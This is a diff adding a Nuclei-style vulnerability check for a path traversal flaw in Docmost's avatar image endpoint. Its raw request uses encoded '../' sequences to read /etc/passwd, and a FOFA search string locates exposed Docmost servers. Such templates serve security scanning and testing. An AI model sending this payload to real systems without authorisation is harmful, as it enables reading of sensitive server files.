@@ -1,0 +1,21 @@
+id: poc-nlb656c7v11l5lfz
+info:
+  name: Docmost img_avatar存在路径穿越漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nlb656c7v11l5lfz'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nlb656c7v11l5lfz
+    fofa: title="Docmost"
+http:
+- raw:
+  - 'GET /api/attachments/img/avatar/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
